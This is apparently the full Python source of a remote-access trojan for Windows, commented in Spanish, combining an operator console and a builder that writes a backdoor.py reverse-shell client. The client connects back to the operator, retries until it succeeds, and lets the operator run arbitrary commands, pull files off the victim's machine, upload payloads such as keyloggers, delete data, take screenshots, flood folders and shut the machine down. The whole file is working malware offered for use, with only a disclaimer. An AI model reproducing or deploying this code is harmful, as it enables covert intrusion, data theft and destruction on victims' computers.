# opennursendoor
#Troyano hecho en python 3.10 para windows 10/11 indetectable. Obtiene un total control remoto de la maquina victima. 

import os
import socket
import struct
import time




buffer = 30000
buffer2 = 1024

def ayuda():
    print("comandos a usar una vez obtenida la conexion\n")
    print('salir             Salir del programa')
    print('dir               listar directorios')
    print('cd                moverse entre directorios (ex: cd photos)')
    print('mkdir             crear carpetas (ex: mkdir videos)')
    print('eliminar          Eliminar archivo o carpeta')
    print('buzzlightyear     Crear un buffer de carpetas infinitas')
    print('apagar            apagar maquina objetivo')
    print('descargar         descargar archivos de victima (ex: descargar test.word)')
    print('subir             subir archivo a victima (ex: subir keylogger.exe)')
    print('cmd               usar consola CMD (ex: cmd systeminfo)')
    print('captura           screenshot a victima. AVISO: Cambiar nombre de captura antes de tomar otra')
    print('ejecutar          ejecutar x programa (ex: ejecutar calc)\n')
        

def dibujo():
    os.system('cls')
    print("""
                                  __
                                .'  '.
                            _.-'/  |  |
                ,       _.-"  ,|  /  0 `-.
                |\    .-"       `--""-.__.'=====================-,
                \ '-'`        .___.--._)=========================|
                \            .'       |     Author: Opennursen   |
                |     /,_.-'          |                          |
             _ /   _.'(               |     Python: v3.10        |
            /  ,-' \  \               |                          |
            \  \    `-'               |     Troyano v1           |
             `-'                      '--------------------------'  
             NOTA: Sea resposable con el uso, Sientase libre de modificar el codigo.
                   El programador no se hace responsable del uso que pueda darle""")
    print("\n                              HAPPY HACKING")
    print("____________________________________________________________________________\n")


def configuracion():
    global host 
    global puerto
    dibujo()
    print("OJO: Si el backdoor lo configuro con ip publica o con direccion Ngrok aqui tiene")
    print("ejemplo de como configurar su servidor")
    print("\nIp Publica: 192.168.1.89        NGROK: 0.0.0.0")
    print("\nOJO: backdoor configurado con ip publica")
    print("no olvides abrir puertos en el route y redirigir el trafico a tu ip local ;)\n") 
    ip = input(str('ingresa tu ip: '))
    host= ip
    port = input("\nDefine un puerto: ")
    portt = int(port)
    puerto = portt

    os.system('cls')
    dibujo()
    print("\nIP: ",host," Puerto: ", puerto)
    confirmacion = input('\nEsto es correcto?(s/n): ')
    if confirmacion == "s" or "S":
        iniciar = input('\niniciar servidor?(s/n): ')
        if iniciar == 's' or 'S':
            conexion_cliente()
            shell()
        elif iniciar == 'n' or 'N':
            inicioMenu()

    elif confirmacion == "n" or "N":
        dibujo()
        inicioMenu()

    else:
        print("opcion no valida. Retornando al menu...")
        time.sleep(2)
        os.system('cls')
        dibujo()
        inicioMenu()
            

def inicioMenu():

    
    while True:
        print("\n $$ Menu de opcion $$\n")
        print("1: configurar e iniciar servidor")
        print("2: crear y configurar troyano")
        print("3: help")
        print("4: salir")
        menu = input('\nopcion: ')
        if menu == "1":
            configuracion()

        elif menu == "2":
            backdoor_config()
        
        elif menu == "3":
            os.system('cls')
            ayuda()
            enter = input('\nenter para continuar: ')
            if enter == "":
                dibujo()
                inicioMenu()
        
        elif menu == "4":
            print("Bye")
            exit()
                
            

     
def conexion_cliente():
    global cliente
    global direccion
    global sock
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, puerto))
    sock.listen(5)
    os.system('cls')
    dibujo()
    print("\n\n[+]Esperando conexion\n")

    cliente, direccion = sock.accept()
    print("\n[+]Conexion establecida\n", direccion)
    directorios = cliente.recv(buffer)
    mostrardirectorios = directorios.decode('cp1252')
    print(mostrardirectorios)


def shell():
        
        print("\n'help' para mas informacion\n")
        while True:
                                          
                #ingreso de teclado para comunicacion
                comandos = input("Shell :) -->")

                #Terminar conexion
                if comandos == "salir":
                    seguro = input("¿Desconectar?(si/no): ")
                    if seguro.lower() == 'no':
                            pass     
                
                    elif seguro.lower() == 'si':
                        print("Cerrando conexion")
                        cliente.send(comandos.encode('cp1252'))
                        break

                

                #Lista los directorios de trabajo            
                elif comandos == "dir":                                            
                    cliente.send(comandos.encode('cp1252'))
                    data = cliente.recv(30000)
                    strdata = data.decode('cp1252')
                    print(strdata)
                    
                #omite un error que se produce al pulsar enter sin nada
                elif comandos == "":
                    continue

                #Para moverse entre directorios EJ: cd .. , cd "nombre carpeta"        
                elif comandos[:2] == "cd":
                    cliente.send(comandos.encode('cp1252'))
                    cd = cliente.recv(buffer)
                    decodecd = cd.decode('cp1252')
                    mostrardirectorios = decodecd
                    print(mostrardirectorios)

                #crea carpetas en el directorio objetivo
                elif comandos[:5] == "mkdir":
                    cliente.send(comandos.encode('cp1252'))
                    on = cliente.recv(buffer)
                    onon = on.decode('cp1252')
                    print(onon)
                
                #Elimina carpetas o archivos
                elif comandos == "eliminar":
                    cliente.send(comandos.encode('cp1252'))
                    while True:
                        opcion = input("¿(1)archivo o (2)carpeta?: ")
                        if opcion == '2' or '1':
                            cliente.send(opcion.encode('cp1252'))
                            name = input("¿El nombre?: ")
                            cliente.send(name.encode('cp1252'))
                            delmessage = cliente.recv(buffer)
                            messagedel = delmessage.decode('cp1252')
                            print(messagedel)
                            break

                        else:
                            print("opcion no valida")
                            continue
                
                #Crea y Llena de tantas carpetas vacias que quieras a la victima (no seas tan malo)   
                elif comandos == "buzzlightyear":
                    cliente.send(comandos.encode('cp1252'))
                    buzz = cliente.recv(buffer)
                    buzzdecode = buzz.decode('cp1252')
                    buzzsend = input(buzzdecode)
                    cliente.send(buzzsend.encode('cp1252'))
                    print("###################################################")
                    print("      DEJANDO LA CAGADA ! ! ! ! :D :D :D    #######")
                    print("###################################################")
                    print("NO OLVIDES HACER DIR PARA VER LA MIERDA QUE DEJASTE")
                    print("####################################################")
                #Apagar pc victima
                elif comandos == "apagar":
                    cliente.send(comandos.encode('cp1252'))
                    recv = cliente.recv(buffer) 
                    print(recv.decode('cp1252'))

                #Descargar archivos remotamente
                elif comandos[:9] == "descargar":
                    
                    nombrearchivo = comandos[10:]
                    

                    cliente.send(comandos.encode('cp1252'))
                    def receive_file_size(sck: socket.socket):
                            fmt = "<Q"
                            expected_bytes = struct.calcsize(fmt)
                            received_bytes = 0
                            stream = bytes()
                            while received_bytes < expected_bytes:
                                chunk = sck.recv(expected_bytes - received_bytes)
                                stream += chunk
                                received_bytes += len(chunk)
                            filesize = struct.unpack(fmt, stream)[0]
                            return filesize

                    def receive_file(sck: socket.socket, filename):
                            
                        filesize = receive_file_size(sck)
                            
                        with open(filename, "wb") as f:
                            received_bytes = 0
                            
                            while received_bytes < filesize:
                                chunk = sck.recv(1024)
                                if chunk:
                                    f.write(chunk)
                                    received_bytes += len(chunk)
                                                                                                
                    print("recibiendo archivo...")   
                    receive_file(cliente, nombrearchivo)
                    print("Archivo recibido")

                #Subir archivos remotamente
                elif comandos[:5] == "subir":

                    namearchivo = comandos[6:]
                    cliente.send(comandos.encode('cp1252'))

                    def send_file(sck: socket.socket, filename):
                        filesize = os.path.getsize(filename)
                        sck.sendall(struct.pack("<Q", filesize))

                        with open(filename, "rb") as f:
                            while read_bytes := f.read(1024):
                                sck.sendall(read_bytes)
                
                    send_file(cliente, namearchivo)
                #Usar CMD de victima
                elif comandos[:3] == "cmd":
                    cliente.send(comandos.encode('cp1252'))
                    cmd_recibe = cliente.recv(30000)
                    print(cmd_recibe.decode('cp1252'))
                #Realizar captura de pantalla y recibir captura. La captura queda eliminada en pc victima :D
                elif comandos == "captura":
                    fmt = "<Q"
                    cliente.send(comandos.encode('cp1252'))
                    filesice = cliente.recv(buffer)
                    files_sice = struct.unpack(fmt, filesice) [0]

                    with open('1.png', 'wb') as f:
                        recibe_sice = 0

                        while recibe_sice < files_sice: 
                            chuken = cliente.recv(1024)
                            if chuken: 
                                f.write(chuken)
                                recibe_sice += len(chuken)
                
                elif comandos[:8] == "ejecutar":
                    cliente.send(comandos.encode('cp1252'))

                elif comandos == "help":
                    ayuda()
                    
                    

                else: 
                    print("opcion no valida")
                    continue

def crearbackdoor():
    conexion_ss = "\nconexion_servidor()"
    ipbackdoorF = f"\nhost='{ipbackdoor}'\n"
    portbackdoorF = "puerto="+portbackdoor
    with open('backdoor.py', 'w') as j:
        j.write("""import socket
import subprocess
import os
import shutil
import random
import string
import struct
import pyautogui
import time




buffer = 30000
buffer2 = 1024


    

lengthdestring = 5

def ejecutar_comandos(comandos):
    return subprocess.check_output(comandos, shell=True)

def conexion_servidor():
    global servidor   
    
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #Sirve para ejecutar primero el backdoor y luego el servidor#
    try:
        time.sleep(3)
        servidor.connect((host, puerto))
        control_shell()
        
    except:
        conexion_servidor()        

def control_shell():
        directorio = os.getcwd()
        servidor.send(directorio.encode('cp1252'))
    
        while True:            
            
            #Recibiendo parametros para shell, decodeando las intrucciones recibidas
                recibo = servidor.recv(30000)
                data  = recibo.decode('cp1252')
                
                if data == "salir":
                    servidor.close
                    conexion_servidor()
                    

                elif data == "dir":
                    comandos = data
                    result = ejecutar_comandos(comandos)
                    servidor.send(result)

                elif data[:2] == "cd" and len(data) > 2:
                    try:
                        os.chdir(data[3:])
                        nuevocd = os.getcwd()
                        servidor.send(nuevocd.encode('cp1252'))
                    except FileNotFoundError:
                        errorr = ("Parece que el directorio no existe :(")
                        servidor.send(errorr.encode('cp1252'))

                elif data[:5] == "mkdir" and len(data) > 5:
                    try:
                        os.mkdir(data[6:])
                    except FileExistsError:
                        FileError = ("Ya existe la carpeta")
                        servidor.send(FileError.encode('cp1252'))
                    else:
                        FileFund = ("Carpeta creada")
                        servidor.send(FileFund.encode('cp1252'))

                elif data == "eliminar":
                    opcion = servidor.recv(30000)
                    resultopcion = opcion.decode('cp1252')
                    nombre = servidor.recv(30000)
                    resultnombre = nombre.decode('cp1252')
                    try:
                        if resultopcion == '2':
                            shutil.rmtree(resultnombre)
                        elif resultopcion == '1':
                            os.remove(resultnombre)
                    except FileNotFoundError:
                        delerror = ("El archivo o carpeta no existe. Comprueba bien el nombre")
                        servidor.send(delerror.encode('cp1252'))
                    else:
                        message = ("Carpeta o archivo eliminado")
                        servidor.send(message.encode('cp1252'))

                elif data  == "buzzlightyear":
                    buzz = "cuantos buffer travieso?: "
                    servidor.send(buzz.encode('cp1252'))
                    buzzrecv = servidor.recv(buffer)
                    buzzclic = buzzrecv.decode('cp1252')
                    name = int(buzzclic)
                                
                    for i in range(name):
                        lista = []
                        lista.append(''.join(random.choice(string.ascii_letters + string.digits) for _ in range(lengthdestring)))
                        os.mkdir(random.choice(lista))

                elif  data == "apagar":
                    try:               
                        subprocess.call(['shutdown', '/s'])
                    except:
                        resultado2 = ("Comando no ejecutado")
                        servidor.send(resultado2.encode('cp1252'))
                    else:
                        resultado = ("Apagando equipo")
                        servidor.send(resultado.encode('cp1252'))

                elif data[:9] == "descargar" and len(data) > 9:
                    
                
                    nombrearchivo = data[10:]
                    
                    def send_file(sck: socket.socket, filename):
                            filesize = os.path.getsize(filename)
                            sck.sendall(struct.pack("<Q", filesize))
                            with open(filename, "rb") as f:
                                while read_bytes := f.read(1024):
                                    sck.sendall(read_bytes)
                    
                    send_file(servidor, nombrearchivo)
                
                elif data[:5] == "subir" and len(data) > 5:

                    namearchivo = data[6:]

                    def receive_file_size(sck: socket.socket):
                        fmt = "<Q"
                        expected_bytes = struct.calcsize(fmt)
                        recceived_bytes = 0
                        stream = bytes()
                        while recceived_bytes < expected_bytes:
                            chunk = sck.recv(expected_bytes - recceived_bytes)
                            stream += chunk
                            recceived_bytes += len(chunk)
                        filesize = struct.unpack(fmt, stream) [0]
                        return filesize

                    def receive_file(sck: socket.socket, filename):

                        filesize  = receive_file_size(sck)

                        with open(filename, "wb") as f:
                            received_bytes = 0

                            while received_bytes < filesize:
                                chunk = sck.recv(1024)
                                if chunk:
                                    f.write(chunk)
                                    received_bytes +=len(chunk)

                    receive_file(servidor, namearchivo)

                elif data[:3] == "cmd" and len(data) > 3:
                    recibo_cmd = data[4:]
                    cmd_data = ejecutar_comandos(recibo_cmd)
                    servidor.send(cmd_data)
                
                elif data[:8] == "ejecutar" and len(data) > 8:
                    ejecutar_cmd = data[9:]
                    ejecutar_process = subprocess.Popen(ejecutar_cmd, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
                    



                elif data == "captura":
                    captura = pyautogui.screenshot("1.png")
                    captura.save

                    filesice = os.path.getsize("1.png")
                    servidor.send(struct.pack("<Q", filesice))

                    with open('1.png', 'rb') as f:
                        while read_capture := f.read(1024):
                            servidor.sendall(read_capture)
                        
                    os.remove("1.png")
                               
                
                else:
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    resultado = proc.stdout.read() + proc.stderr.read()
                    servidor.send(resultado)

""")
        j.close()
    with open('backdoor.py', 'a') as a:
        a.write(ipbackdoorF)
        a.write(portbackdoorF)
        a.write(conexion_ss)
        a.close()
    
    print("Backdoor creado...Retornando al menu")
    time.sleep(3)
    os.system('cls')
    dibujo()
    inicioMenu()

def backdoor_config():
    global ipbackdoor
    global portbackdoor
    os.system('cls')
    dibujo()
    ipbackdoor = input("ingrese ip servidor: ")
    portbackdoor = input("\nDefina un puerto: ")
    print("\nIP: ",ipbackdoor, "Puerto: ",portbackdoor)
    confirmacion = input("\nEs correcto?(s/n): ")
    if confirmacion == "s" or "S":
        crearbackdoor()
    elif confirmacion == "n" or "N":
        inicioMenu()

dibujo()
inicioMenu()
       











